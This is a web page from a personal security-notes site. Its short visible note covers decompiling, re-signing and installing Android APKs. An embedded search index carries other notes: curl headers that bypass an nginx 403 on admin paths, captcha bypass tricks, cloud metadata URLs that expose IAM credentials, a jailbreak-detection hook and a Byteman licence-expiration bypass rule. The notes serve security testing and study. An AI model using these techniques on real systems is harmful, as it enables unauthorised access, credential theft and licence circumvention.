<!DOCTYPE html>
<html><title>Android Recompilation</title>


<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
/>
<meta name="apple-mobile-web-app-capable" content="yes" />

<link href="./favicon.png" rel="icon" type="image/x-icon" />


<link rel="stylesheet" href="./css/index.db0ff6adb85d12a55dc7afd153794f1bb4b22f39d3efe031d0be4456af877dea.css" />

<style type="text/css">
  :root {
    --color: #333;
    --background-color: #fafafa;
    --line-height: 1.4;
    --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";

    --header-background-color: #ffffff;
    --header-border-bottom-color: #ccc;
    --header-color: #000000;

    --page-background-color: #ffffff;
    --page-border-left-color: rgba(0, 0, 0, 0.05);
    --page-link-color: rgba(10, 132, 255, 1);
    --page-max-width: 625px;
    --page-font-size: 17px;
    --page-line-height: 24px;
    --page-hr-background-color: #dddddd;

    --backlinks-background-color: #fafafc;
    --backlinks-border-radius: 16px;
    --backlink-label-color: #888888;
    --backlink-title-color: #000000;
    --backlink-preview-color: rgb(102, 102, 102);
    --backlink-hover-background-color: rgba(0, 0, 0, 0.05);

    --preview-width: 625px;
    --preview-max-height: 400px;
    --preview-scale: 0.8;
    --preview-box-shadow-top-color: rgba(0, 0, 0, 0.08);
    --preview-box-shadow-right-color: rgba(0, 0, 0, 0.04);
    --preview-box-shadow-bottom-color: rgba(0, 0, 0, 0.15);
    --preview-box-shadow-left-color: rgba(0, 0, 0, 0.04);

    --search-extract-color: #aaaaaa;
  }

 .menu-item-position {
    font-size: 14px;
    display: inline;
    margin: 0 5px 0 0;
}

.menu-item {
    margin: 0 0 10px 0;
    font-weight: bold;
}
.menu-item {
    font-size: 100%;
}

#head {
    margin-left: 15px;
    font-family: "Courier New";
    font: 14px 'Courier New';
     
}

#wrap {
    width: 550px;
    margin: 10px;
}

body {
    background: #fff;
     
}

.title-coded {
    font-size: 12px;
}
</style>


<body><header>
    <a href="./index" id="logo-and-title">
    
    <div class="site-logo">
       <img class="site-logo" src="./favicon.png" />
    </div>
        </a>

        <div id="head">
            <h1 class="menu-item menu-item-position"><a class="author" href="./"></a></h1> / 
            <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/about.html">halis duraki</a></h1> /
            <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/reports.html">security rep+</a></h1> / 
            <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/consulting/">consulting</a></h1> / 
            <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/">blog</a> </h1>
        </div><form id="search"
    action='https://duraki.github.io/notes/public/search.html' method="get">
    <label hidden for="search-input">Search site</label>
    <input type="text" id="search-input" name="query"
    placeholder="Type here to search">
    <input type="submit" value="search">
</form>
</header>

<div class="grid-container">
  <div class="grid">
    <div class="page" data-level="1">
      <div class="content">
        <h1>Android Recompilation</h1>
        <p>Decompile Android APK file using <code>apktool</code>:</p>
<pre tabindex="0"><code># =&gt; decompile
$ apktool -r d AppName.apk -o AppName

# =&gt; recompile
$ apktool b AppName
</code></pre><p>Resign the APK package and install the Android application:</p>
<pre tabindex="0"><code># =&gt; sign the apk package
$ keytool -genkey -keystore example.keystore -validity 10000 -alias example
$ jarsigner -keystore example.keystore -verbose AppName.apk example

# =&gt; installation
$ apk install AppName.apk
</code></pre>
      </div>
      



   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   
      
   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   

   



  <div class="bl-section">
    <h4>Links to this note</h4>
    <div class="backlinks">
      
        <a href="./list-of-topics.html" class="backlink-anchor">
          <div class="backlink">
            <p class="backlink-title">List of Topics</p>
            <p class="backlink-preview">* [Android Recompilation](/android-recompilation)  </p>
          </div>
        </a>
      
    </div>
  </div>


      </div>
   </div>
</div>

<script src="https://duraki.github.io/notes/public/js/URI.js" type="text/javascript"></script>

<script src="https://duraki.github.io/notes/public/js/page.js" type="text/javascript"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
<script>
window.store = {
    
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/": {
        
        "title": "Index",
        "tags": [],
        "content": "Hello, these are my personal notes and knowledge graph. I started using Obsidian a bit early in 2020. and continued graphing my knowledge from there.\nI wanted something more towards functional, as to offer me a practical snippet library for my TTP\u0026rsquo;s, both online and as a backup of dementia.\nThe notes are largery inspired by others and especial Andy\u0026rsquo;s note-taking samples on his site. Thanks to Justin and Jethro for their theme support on static generation for this library of mine. Hope it will be worth to you as well as me.\nYou can start exploring from the List of Topics, List of Tools, or see the full list of notes.\n title: \u0026ldquo;List of Topics\u0026rdquo; Personal list of topics of interest. At least for me eh? :)\nAutomotive Cyber Security  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\n todo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash  Misc  Windows Notes Linux Notes MacOS Notes How to write Notes Troubleshoot ~ ideas   How it works Additionalities offered through [params.styles] via config.toml. It\u0026rsquo;s possible to deploy dark version as well. Read for more in *.css.\n  This website is provided for free educational purposes. Knowledge shared here can be used for personal gain and experience.  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/search.html": {
        
        "title": "Search",
        "tags": [],
        "content": "", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/search.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/~-ideas.html": {
        
        "title": "~ ideas",
        "tags": [],
        "content": " SonicWall SMA100 Firmware 1day OPC Router DLL Hijacking, XML Attack via Licenses  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/~-ideas.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/android-recompilation.html": {
        
        "title": "Android Recompilation",
        "tags": [],
        "content": "Decompile Android APK file using apktool:\n# =\u0026gt; decompile $ apktool -r d AppName.apk -o AppName # =\u0026gt; recompile $ apktool b AppName Resign the APK package and install the Android application:\n# =\u0026gt; sign the apk package $ keytool -genkey -keystore example.keystore -validity 10000 -alias example $ jarsigner -keystore example.keystore -verbose AppName.apk example # =\u0026gt; installation $ apk install AppName.apk ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/android-recompilation.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/android-reverse-engineering.html": {
        
        "title": "Android Reverse Engineering",
        "tags": [],
        "content": "Burp Proxy Setup If using Android 7 or above, you need to export Burp CA Certificate from Proxy â†’ Options, and selecting Import/Export CA certificate. Android wants the certificate to be in PEM format. The filename has to be equal to the subject_hash_old value appended with .0.\nNote - if you are using OpenSSL \u0026lt; 1.0, you need to use subject_hash instead of subject_hash_old.\nUsing openssl is recommended way to convert DER to PEM format. Dump the subject_hash_old and rename the file as explained above.\n$ openssl x509 -inform DER -in cacert.der -out cacert.pem $ openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1 $ mv cacert.pem \u0026lt;hash\u0026gt;.0 Push the certificate onto Android device by using adb or ssh:\n# =\u0026gt; move cert to the device $ adb push \u0026lt;hash\u0026gt;.0 /data/local/tmp # =\u0026gt; on android device: $ adb shell % su % mount -o rw,remount /system % mv /data/local/tmp/\u0026lt;hash\u0026gt;.0 /system/etc/security/cacerts/ % chown root:root /system/etc/security/cacerts/\u0026lt;hash\u0026gt;.0 % chmod 644 /system/etc/security/cacerts/\u0026lt;hash\u0026gt;.0 % reboot Using Logcat on Android To use built-in logcat, append the following:\n$ adb shell \u0026#39;logcat --pid=$(pidof -s x.xxx.xxx.xxxxx.xx)\u0026#39; References\n Android Nougat and Burp Proxy Configuration Install custom CA on Android Generic Android Deobfuscator Injecting Frida via Lief Frida on non-rooted device InjectFridaGadget tool Proxying Android App traffic  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/android-reverse-engineering.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/api-penetration-test-checklist.html": {
        
        "title": "API Penetration Test Checklist",
        "tags": [],
        "content": "--- ## Authentication - [ ] Don\u0026#39;t use `Basic Auth`. Use standard authentication instead (e.g. [JWT](https://jwt.io/), [OAuth](https://oauth.net/)). - [ ] Don\u0026#39;t reinvent the wheel in `Authentication`, `token generation`, `password storage`. Use the standards. - [ ] Use `Max Retry` and jail features in Login. - [ ] Use encryption on all sensitive data. ### JWT (JSON Web Token) - [ ] Use a random complicated key (`JWT Secret`) to make brute forcing the token very hard. - [ ] Don\u0026#39;t extract the algorithm from the header. Force the algorithm in the backend (`HS256` or `RS256`). - [ ] Make token expiration (`TTL`, `RTTL`) as short as possible. - [ ] Don\u0026#39;t store sensitive data in the JWT payload, it can be decoded [easily](https://jwt.io/#debugger-io). ### OAuth - [ ] Always validate `redirect_uri` server-side to allow only whitelisted URLs. - [ ] Always try to exchange for code and not tokens (don\u0026#39;t allow `response_type=token`). - [ ] Use `state` parameter with a random hash to prevent CSRF on the OAuth authentication process. - [ ] Define the default scope, and validate scope parameters for each application. ## Access - [ ] Limit requests (Throttling) to avoid DDoS / brute-force attacks. - [ ] Use HTTPS on server side to avoid MITM (Man in the Middle Attack). - [ ] Use `HSTS` header with SSL to avoid SSL Strip attack. - [ ] For private APIs, only allow access from whitelisted IPs/hosts. ## Input - [ ] Use the proper HTTP method according to the operation: `GET (read)`, `POST (create)`, `PUT/PATCH (replace/update)`, and `DELETE (to delete a record)`, and respond with `405 Method Not Allowed` if the requested method isn\u0026#39;t appropriate for the requested resource. - [ ] Validate `content-type` on request Accept header (Content Negotiation) to allow only your supported format (e.g. `application/xml`, `application/json`, etc.) and respond with `406 Not Acceptable` response if not matched. - [ ] Validate `content-type` of posted data as you accept (e.g. `application/x-www-form-urlencoded`, `multipart/form-data`, `application/json`, etc.). - [ ] Validate user input to avoid common vulnerabilities (e.g. `XSS`, `SQL-Injection`, `Remote Code Execution`, etc.). - [ ] Don\u0026#39;t use any sensitive data (`credentials`, `Passwords`, `security tokens`, or `API keys`) in the URL, but use standard Authorization header. - [ ] Use an API Gateway service to enable caching, Rate Limit policies (e.g. `Quota`, `Spike Arrest`, or `Concurrent Rate Limit`) and deploy APIs resources dynamically. ## Processing - [ ] Check if all the endpoints are protected behind authentication to avoid broken authentication process. - [ ] User own resource ID should be avoided. Use `/me/orders` instead of `/user/654321/orders`. - [ ] Don\u0026#39;t auto-increment IDs. Use `UUID` instead. - [ ] If you are parsing XML files, make sure entity parsing is not enabled to avoid `XXE` (XML external entity attack). - [ ] If you are parsing XML files, make sure entity expansion is not enabled to avoid `Billion Laughs/XML bomb` via exponential entity expansion attack. - [ ] Use a CDN for file uploads. - [ ] If you are dealing with huge amount of data, use Workers and Queues to process as much as possible in background and return response fast to avoid HTTP Blocking. - [ ] Do not forget to turn the DEBUG mode OFF. ## Output - [ ] Send `X-Content-Type-Options: nosniff` header. - [ ] Send `X-Frame-Options: deny` header. - [ ] Send `Content-Security-Policy: default-src \u0026#39;none\u0026#39;` header. - [ ] Remove fingerprinting headers - `X-Powered-By`, `Server`, `X-AspNet-Version`, etc. - [ ] Force `content-type` for your response. If you return `application/json`, then your `content-type` response is `application/json`. - [ ] Don\u0026#39;t return sensitive data like `credentials`, `Passwords`, or `security tokens`. - [ ] Return the proper status code according to the operation completed. (e.g. `200 OK`, `400 Bad Request`, `401 Unauthorized`, `405 Method Not Allowed`, etc.). ## CI \u0026amp; CD - [ ] Audit your design and implementation with unit/integration tests coverage. - [ ] Use a code review process and disregard self-approval. - [ ] Ensure that all components of your services are statically scanned by AV software before pushing to production, including vendor libraries and other dependencies. - [ ] Design a rollback solution for deployments. --- ## See also: - [yosriady/api-development-tools](https://github.com/yosriady/api-development-tools) - A collection of useful resources for building RESTful HTTP+JSON APIs. ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/api-penetration-test-checklist.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/automotive-cybersecurity-videos.html": {
        
        "title": "Automotive Cybersecurity Videos",
        "tags": [],
        "content": "https://www.youtube.com/watch?v=xHfInsMEYdQ https://www.youtube.com/watch?v=DUNWZnhneiI https://www.youtube.com/watch?v=mz55tsLnlSc https://www.youtube.com/watch?v=k50hU6aPlG8 https://www.youtube.com/watch?v=k4JD2ZUHrXA - Cert-based auth via UDS https://www.youtube.com/watch?v=KqV5nIkGKFs - CANFD explained https://www.youtube.com/watch?v=XMVLkbw1BNE - New Standard for Ethernet on a Bus Line (10BASE-T1S) https://www.youtube.com/watch?v=WW481idfcro - Cert-based auth via Vector tool https://www.youtube.com/watch?v=pxlx3_gEiFM - Embedded Security in Automotive https://www.youtube.com/watch?v=3uU0Sl-byVc - Using ML to detect anomalyes https://www.youtube.com/watch?v=QEOWjEytb6Y - Cert-based in diagnostics (in-depth) https://www.youtube.com/watch?v=bUdxpsQXeRU - Corporate security testing in Automotive https://www.youtube.com/watch?v=DuXhz4mDYZA - From TARA to Pentest https://www.youtube.com/watch?v=7D7uNqPWrXw - Using Scapy for Car pentesting\nhwio\nhttps://www.youtube.com/watch?v=2fplLJ3S3d0 https://www.youtube.com/watch?v=Myp4-RsdE-Y https://www.youtube.com/watch?v=Hzazchbvu6M https://www.youtube.com/watch?v=dZVWXP2j0co https://www.youtube.com/watch?v=10Dag6ee2d8\nudemy/can interface https://deloittedevelopment.udemy.com/course/master-can-protocol-completely-from-scratch/learn/\n Provided by Aron S.\n check these out to see how the UI looks. They have their own scripting language called CAPL:\nhttps://www.youtube.com/watch?v=uffjocL9Zt8 https://www.youtube.com/watch?v=KbVPeI9A_ME\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/automotive-cybersecurity-videos.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/automotive-hacking.html": {
        
        "title": "Automotive Hacking",
        "tags": [],
        "content": " Link ECUs to avoid wires (weight, size, cost) Network Protocols allow ECUs to share information quickly and precisely (Ethernet \u0026amp; CANFD/CAN) Networks used between ECUs are based on Serial Communications  Serial means that items of information are sent via a single stream of communication   Speed of communication is measured in number of bits sent per second (bps) CAN (Controller Area Network) bus was developed to meet needs of up to 1 million bits per second (1Mbps) LIN (Local Interconnect Network) introduced to give a lower cost, lower speed altenative (~20 kbps) FlexRay was developed for more fault-tolerant, higher speed (10Mbps) network Ethernet (100Mbps) for videos and advanced driver assistance systems (new vehicles)  Special ECU are used called \u0026ldquo;gateways\u0026rdquo; to interconnect different network protocols (CAN + LIN, or Ethernet + FlexRay etc.)\nVehicle Diagnostics  ECUs provide diangostis services OBD standardises requests and responses related to diagnostics ISO 14229-1 (UDS) Standard  Defines structures and content of how data is interpreted   Read Fault Memory in the form of Diagnostic Trouble Codes from the ECU (detect faults)  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/automotive-hacking.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/bash-in-simple-words.html": {
        
        "title": "Bash in simple words",
        "tags": [],
        "content": "The first two statements of your Bash script should be:\n#!/usr/bin/env bash set -euo pipefail The first statement is a Mac, GNU/Linux, and BSD portable way of finding the location of the bash interpreter.\nThe second statement combines:\n set -e which ensures that your script stops on first command failure. By default, when a command fails, BASH executes the next command. Looking at the logs, you might feel that the script executed successfully while some commands might have failed. Caveat: Be careful about applying it to existing scripts. set -u which ensures that your script exits on the first unset variable encountered. Otherwise, bash replaces the unset variables with empty default values. set -o pipefail which ensures that if any command in a set of piped commands failed, the overall exit status is the status of the failed command. Otherwise, the exit status is the status of the last command.  Example of valid shell script:\n#!/bin/sh # Author: # License: Unlicense set -euf log() { printf \u0026#39;\\033[32m-\u0026gt;\\033[m %s\\n\u0026#39; \u0026#34;$*\u0026#34; } die() { log \u0026#34;$*\u0026#34; \u0026gt;\u0026amp;2 exit 1 } usage() { echo \u0026#34;${0##*/} ARGS desc \u0026#34; exit 0 } ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/bash-in-simple-words.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/blog-setup.html": {
        
        "title": "Blog Setup",
        "tags": [],
        "content": "The blog is using a custom site generator called art and it uses Ruby and some wrapper magic to generate this from a rather minimal configuration setup in .home.yml file.\n--- minimal: artist: \u0026#34;Your Name\u0026#34; title: \u0026#34;Blog Title\u0026#34; description: \u0026#34;Blog description.\u0026#34; theme: \u0026#34;theme-name\u0026#34; posts: in: /posts/in # =\u0026gt; post in (md) out: /posts/out # =\u0026gt; post out (html) scripts: - \u0026#34;my super href:/about/me.html\u0026#34; # =\u0026gt; Links/URIs/Other art: ga: UA-00000000-X # =\u0026gt; your Google Analytics ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/blog-setup.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/bypass-403-on-nginx.html": {
        
        "title": "Bypass 403 on nginx",
        "tags": [],
        "content": "Normally a client can\u0026rsquo;t access /admin directory because of front nginx server which returns 403 Forbidden. We can:\n* use `X-Rewrite-Url` or `X-original-url` * back server processes these headers and front server doesn't.  Steps to reproduce:\nnormally\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: login.example.com\u0026#39; $\u0026#39;https://login.example.com/admin/login\u0026#39; 403 Forbidden ... bypass (1)\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: login.example.com\u0026#39; -H $\u0026#39;X-rewrite-url: admin/login\u0026#39; $\u0026#39;https://login.example.com/\u0026#39; 200 OK bypass (2)\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: example.ba\u0026#39; -H $\u0026#39;X-rewrite-url: admin\u0026#39; $\u0026#39;https://example.ba/\u0026#39; 200 OK ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/bypass-403-on-nginx.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/byteman.html": {
        
        "title": "Byteman",
        "tags": [],
        "content": "Introduction Byteman is a bytecode manipulation tool for tweaking and changing Java application at load time and runtime. It work without the needs for recompilation. The modification is purely in memory, via Event Condition Action rule language - based on Java.\nRules Write ECA based rules which you can inject using Byteman directives and command line application.\n# =\u0026gt; trace.btm RULE trace main entry CLASS ^CognitiveApp METHOD main AT ENTRY IF TRUE DO traceln(\u0026#34;Byteman: Application loaded successfully. java.application.main() called.\u0026#34;) ENDRULE Replace the CognitiveApp with any class handling the Main application login. Use JD-GUI to find for main() functions. It\u0026rsquo;s important to leave ^ char because it indicates the regex pattern.\nRegisters The following registers exists:\n RULE, CLASS, METHOD (Description, Classname, Method Name) AT ENTRY, AT EXIT AT EXCEPTION EXIT AT EXCEPTION ENTRY IF TRUE (Run always)  IF counter / 5 == 10   DO (Execute command)  DO incrementCounter(\u0026ldquo;cnt\u0026rdquo;) DO trace(\u0026ldquo;Trace string line\u0026rdquo;) DO traceStack(\u0026ldquo;Trace stack line\u0026rdquo;)   BIND (Read variable)  BIND counter = readCounter(\u0026ldquo;cnt\u0026rdquo;)   ENDRULE (Script end)  Running  Run the Java application either via Command Line or from the *.shortcut Add %JAVABYTE_HOME% environment in Windows/Linux (ie. setx on Windows, or export on Linux) Create a RULE Use bminstall.bat $PID to inject Byteman in the JVM runtime Use bmsubmit.bat ..\\scripts\\trace.btm to register Byteman script Watch application stdout log output and search for traceln tagged calls  # =\u0026gt; WinNT injection example \u0026gt; cd byteman/bin \u0026gt; bminstall.bat $PID \u0026gt; bmsubmit.bat ..\\scripts\\trace.btm Cannot locate byteman JBoss modules plugin jar redefine rule trace main entry Scripts List of scripts and usage on Byteman Scripts. Just for reference.\nReferences  Official JBoss Byteman Programmers Guide Official Script Samples A Byteman Tutorial JUDCon Flavia Race Condition Bytemon Slides Blog - How to use JBoss and Bytemon Hooking into vulnerabilities in Java applications  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/byteman.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/byteman-scripts.html": {
        
        "title": "Byteman Scripts",
        "tags": [],
        "content": "Simple trace skeleton\nRULE trace CLASS ^App METHOD login AT ENTRY IF true DO System.out.println(\u0026#34; Tracing login stdout\u0026#34;) DO traceln(\u0026#34;Tracing login ended\u0026#34;) ENDRULE Trace application entry\nRULE trace application entry CLASS ^App METHOD main AT ENTRY IF TRUE DO traceln(\u0026#34;BMB java.application.main() called!\u0026#34;) ENDRULE Trace application exit\nRULE trace application exit CLASS ^App METHOD main AT EXIT IF TRUE DO traceln(\u0026#34;BMB java.application exited\u0026#34;) ENDRULE Thread start\nRULE trace thread start CLASS java.lang.Thread METHOD start() IF true DO traceln(\u0026#34;*** BMB start for thread: \u0026#34; + $0.getName()) ENDRULE Trace application login\nRULE trace application login CLASS ^LoginApi METHOD login AT ENTRY IF TRUE DO traceln(\u0026#34;BMB java.application.login() called!\u0026#34;) ENDRULE Trace class create entry\nRULE ClassLoadMonitor trace create CLASS java.lang.ClassLoader METHOD defineClass(String, byte[], int, int, ProtectionDomain) AT EXIT IF TRUE DO traceStack(\u0026#34;*** BMB Called defineClass(\u0026#34; + $1 + \u0026#34;) in thread \u0026#34; + Thread.currentThread().getName() + \u0026#34;\\n\u0026#34;, 10) ENDRULE Early return\nRULE bypass license expiration CLASS ^App METHOD checkForSecurity AT ENTRY DO debug(\u0026#34;returning earlz with bool\u0026#34;); return true ENDRULE Set default TimeZone\n RULE check setDefault CLASS java.util.TimeZone METHOD setDefault(TimeZone) AT ENTRY IF TRUE DO traceStack(\u0026#34;XXX attempting to get change the default timezone \u0026#34;+ \u0026#34;: parameter : \u0026#34; +$1 + \u0026#34; : detail : \u0026#34; + $1.getDisplayName()) ENDRULE ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/byteman-scripts.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/canfd-specifications.html": {
        
        "title": "CANFD Specifications",
        "tags": [],
        "content": " Extended CAN frame. Can send larger payloads. A bit different structure. Using CANEdge2 for testing the CANFD frames.  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/canfd-specifications.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/captcha-bypass-tricks.html": {
        
        "title": "Captcha Bypass Tricks",
        "tags": [],
        "content": "Header Injection to bypoass Captcha\n1. Response manipulation. 2. Use previously used token. 3. Use any token with same length(+1/-1). 4. Remove the param value or remove the entire parameter. 5. Change method from POST to GET(or PUT) and remove the captcha. 6. Change body to JSON or vice-versa. 7. OCR. 8. Check whether the captcha is in the source code. (Ex: 2+2) 9. Check whether the value of the captcha is in the source code. 10. Use the same captcha value with the different sessionIDs. 11. JSON Body? Combine 6 and 5. 12. Add headers: X-Forwarded-Host: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Client-IP: 127.0.0.1 X-Host: 127.0.0.1 ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/captcha-bypass-tricks.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/categories.html": {
        
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/categories.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/classical-api-abuse.html": {
        
        "title": "Classical API Abuse",
        "tags": [],
        "content": "API Keys Reuse Use Keyhacks to scan for key leaks.\nAPI Calling Convention Try to hook() on a call or initiate new calls from the handler.\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/classical-api-abuse.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/cloud-metadata.html": {
        
        "title": "Cloud Metadata",
        "tags": [],
        "content": "AWS # from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key AWS (dirs ) http://169.254.169.254/ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/public-keys/ Google Cloud # https://cloud.google.com/compute/docs/metadata # - Requires the header \u0026#34;Metadata-Flavor: Google\u0026#34; or \u0026#34;X-Google-Metadata-Request: True\u0026#34; http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id # Google allows recursive pulls http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true Google # Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn) http://metadata.google.internal/computeMetadata/v1beta1/ Digital Ocean # https://developers.digitalocean.com/documentation/metadata/ http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address Packetcloud https://metadata.packet.net/userdata Azure # Limited, maybe more exist? # https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/ http://169.254.169.254/metadata/v1/maintenance ## Update Apr 2017, Azure has more support; requires the header \u0026#34;Metadata: true\u0026#34; # https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service http://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02\u0026amp;format=text OpenStack/RackSpace # (header required? unknown) http://169.254.169.254/openstack HP Helion # (header required? unknown) http://169.254.169.254/2009-04-04/meta-data/ Oracle Cloud http://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/ Alibaba http://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/cloud-metadata.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/cycript.html": {
        
        "title": "Cycript",
        "tags": [],
        "content": "Tips and Tricks\nGet pasteboard/clipboard items.\n[UIPasteboard generalPasteboard].items Get UI elements dump.\n[[UIApp keyWindow] recursiveDescription] Bypass Jailbreak UIAlertController via Cycript\nfunction bypassJailbreakDetection() { try { var hook = ObjC.classes.Utils[\u0026#39;+ isJailbroken\u0026#39;]; Interceptor.attach(hook.implementation, { onLeave: function(oldValue) { _newValue = ptr(\u0026#34;0x0\u0026#34;) ; oldValue.replace(_newValue); } }); } catch(err) { console.log(\u0026#34;[-] Error: \u0026#34; + err.message); } } \u0026hellip; from Dynamic Analysis and Hacking.\nSyslog Macros\n# =\u0026gt; common.cy @import com.saurik.substrate.MS NSLog_ = dlsym(RTLD_DEFAULT, \u0026#34;NSLog\u0026#34;) NSLog = function() { var types = \u0026#39;v\u0026#39;, args = [], count = arguments.length; for (var i = 0; i != count; ++i) { types += \u0026#39;@\u0026#39;; args.push(arguments[i]); } new Functor(NSLog_, types).apply(null, args); } Load the macro into Cycript:\n$ cycript -p App common.cy $ cycript -p App Read syslog for log lines:\nsocat - UNIX-CONNECT:/var/run/lockdown/syslog.sock watch ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/cycript.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/decrypt-ipa-from-appstore.html": {
        
        "title": "Decrypt IPA from AppStore",
        "tags": [],
        "content": "Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.\n# =\u0026gt; Start iproxy $ iproxy 2222 22 # =\u0026gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =\u0026gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ... ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/decrypt-ipa-from-appstore.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/ecu-calibration.html": {
        
        "title": "ECU Calibration",
